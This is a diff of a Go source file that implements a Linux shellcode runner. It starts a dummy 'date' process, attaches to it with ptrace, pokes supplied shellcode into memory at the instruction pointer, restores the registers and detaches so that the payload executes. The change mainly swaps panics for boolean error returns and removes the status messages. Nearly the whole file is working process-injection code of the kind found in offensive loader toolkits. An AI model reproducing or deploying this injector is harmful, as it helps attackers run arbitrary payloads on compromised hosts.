@@ -9,12 +9,25 @@ import (
 // Runner runner
 func Runner(shellcode []byte) bool {
 	tPid := generateDummyProcess()
-	attachToProcessAndWait(tPid)
+	if tPid == 0 {
+		return false
+	}
+	if !attachToProcessAndWait(tPid) {
+		return false
+	}
 	registers := getRegisters(tPid)
-	pcPtr := uintptr(registers.PC())
-	copyShellcode(tPid, shellcode, pcPtr)
-	setRegisters(tPid, registers)
-	detachFromProcess(tPid)
+	if registers == (syscall.PtraceRegs{}) {
+		return false
+	}
+	if !copyShellcode(tPid, shellcode, uintptr(registers.PC())) {
+		return false
+	}
+	if !setRegisters(tPid, registers) {
+		return false
+	}
+	if !detachFromProcess(tPid) {
+		return false
+	}
 	return true
 }
 
@@ -24,58 +37,61 @@ func IsAvailable() bool {
 }
 
 func generateDummyProcess() int {
-	// var tPid = 1461
-	fmt.Println("[+] Generate dummy process")
 	cmd := exec.Command("date")
 	cmdErr := cmd.Start()
 	if cmdErr != nil {
-		panic(cmdErr.Error())
+		fmt.Println(cmdErr.Error())
 	}
 	return cmd.Process.Pid
 }
 
-func attachToProcessAndWait(tPid int) {
+func attachToProcessAndWait(tPid int) bool {
+	var status syscall.WaitStatus
 	attachErr := syscall.PtraceAttach(tPid)
 	if attachErr != nil {
-		fmt.Println("[-] Attaching to process failed")
-		panic(attachErr.Error())
+		fmt.Println(attachErr.Error())
+		return false
 	}
-	var status syscall.WaitStatus
-	_, err := syscall.Wait4(tPid, &status, syscall.WALL, nil)
-	if err != nil {
-		panic(err.Error())
+	_, waitErr := syscall.Wait4(tPid, &status, syscall.WALL, nil)
+	if waitErr != nil {
+		fmt.Println(waitErr.Error())
+		return false
 	}
+	return true
 }
 
-func detachFromProcess(tPid int) {
-	fmt.Println("[+] Execute shellcode")
+func detachFromProcess(tPid int) bool {
 	detachErr := syscall.PtraceDetach(tPid)
 	if detachErr != nil {
-		panic(detachErr.Error())
+		fmt.Println(detachErr.Error())
+		return false
 	}
+	return true
 }
 
-func copyShellcode(pid int, shellcode []byte, dst uintptr) {
-	_, err := syscall.PtracePokeData(pid, dst, shellcode)
-	if err != nil {
-		panic(err.Error())
+func copyShellcode(pid int, shellcode []byte, dst uintptr) bool {
+	_, copyErr := syscall.PtracePokeData(pid, dst, shellcode)
+	if copyErr != nil {
+		fmt.Println(copyErr.Error())
+		return false
 	}
+	return true
 }
 
 func getRegisters(pid int) syscall.PtraceRegs {
 	var regs syscall.PtraceRegs
-	err := syscall.PtraceGetRegs(pid, &regs)
-	if err != nil {
-		fmt.Println("[-] Getting process registers failed")
-		panic(err.Error())
+	regsErr := syscall.PtraceGetRegs(pid, &regs)
+	if regsErr != nil {
+		fmt.Println(regsErr.Error())
 	}
 	return regs
 }
 
-func setRegisters(pid int, regs syscall.PtraceRegs) {
-	err := syscall.PtraceSetRegs(pid, &regs)
-	if err != nil {
-		fmt.Println("[-] Setting process registers failed")
-		panic(err.Error())
+func setRegisters(pid int, regs syscall.PtraceRegs) bool {
+	regsErr := syscall.PtraceSetRegs(pid, &regs)
+	if regsErr != nil {
+		fmt.Println(regsErr.Error())
+		return false
 	}
+	return true
 }
